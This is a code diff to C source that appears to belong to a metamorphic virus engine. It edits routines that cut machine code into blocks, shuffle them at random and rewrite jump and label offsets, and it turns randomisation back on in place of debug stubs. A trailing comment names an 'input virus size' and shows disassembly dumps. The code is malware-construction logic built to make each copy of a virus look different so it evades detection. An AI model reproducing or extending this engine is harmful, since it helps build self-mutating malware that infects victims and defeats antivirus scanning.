@@ -37,9 +37,7 @@ bool		want_to_cut_clean(size_t block_length, size_t delta,
 	size_t		closeness = (block_length * 100) / delta;
 	uint64_t	rand      = random_inrange(seed, 0, 100);
 
-	// return (closeness > rand);
-	// return false;
-	return true;
+	return (closeness > rand);
 }
 
 static bool	split_ref(struct safe_ptr *ref_origin,
@@ -166,8 +164,7 @@ static bool	shard_block(struct code_block *blocks[NBLOCKS], \
 
 static bool     want_to_permutate(uint64_t *seed)
 {
-	// return random(seed) % 2;
-	return true;
+	return random(seed) % 2;
 }
 
 /*
@@ -209,7 +206,7 @@ static bool	shuffle_blocks(struct code_block *blocks[NBLOCKS], uint64_t seed)
 ** - shifts jumps back to original destination (negative block shift amount)
 ** - shifts labels with their blocks
 */
-static void	shift_jumps(struct jump *jumps, size_t njumps, int shift_amount)
+static void	shift_jumps(struct jump *jumps, size_t njumps, int32_t shift_amount)
 {
 	for (size_t i = 0; i < njumps; i++)
 	{
@@ -217,7 +214,7 @@ static void	shift_jumps(struct jump *jumps, size_t njumps, int shift_amount)
 	}
 }
 
-static void	shift_labels(struct label *labels, size_t nlabels, int shift_amount)
+static void	shift_labels(struct label *labels, size_t nlabels, int32_t shift_amount)
 {
 	for (size_t i = 0; i < nlabels; i++)
 	{
@@ -230,7 +227,7 @@ static void	shift_labels(struct label *labels, size_t nlabels, int shift_amount)
 
 static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 {
-	int	trailing_jumps_additionnal_shift = 0;
+	int32_t	trailing_jumps_additionnal_shift = 0;
 
 	for (size_t i = 0; i < NBLOCKS; i++)
 	{
@@ -244,6 +241,7 @@ static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 		if (b->trailing_block)
 			trailing_jumps_additionnal_shift += JUMP32_INST_SIZE;
 	}
+
 	return true;
 }
 
@@ -392,7 +390,7 @@ bool		permutate_blocks(struct safe_ptr input_code, \
 	struct block_allocation		block_memory;
 	struct code_block		*blocks[NBLOCKS];
 
-	if (!disasm_block(&block_memory, input_code.ptr, input_code.size) // TODO pass safe pointer, rewrite func
+	if (!disasm_block(&block_memory, input_code)
 	|| !shard_block(blocks, block_memory.blocks, &seed)
 	|| !shuffle_blocks(blocks, seed)
 	|| !shift_blocks(blocks)
@@ -502,4 +500,8 @@ input virus size: 67944
 0x00007ffff7fc942f:	0f 1f 44 00 00	nop    DWORD PTR [rax+rax*1+0x0]
 0x00007ffff7fc9434:	00 00	add    BYTE PTR [rax],al
 0x00007ffff7fc9436:	00 00	add    BYTE PTR [rax],al
+
+--------------------------------------------------------------------------------
+
+0x00000000004223a5:	e8 db 53 00 00	call   0x427785
 */
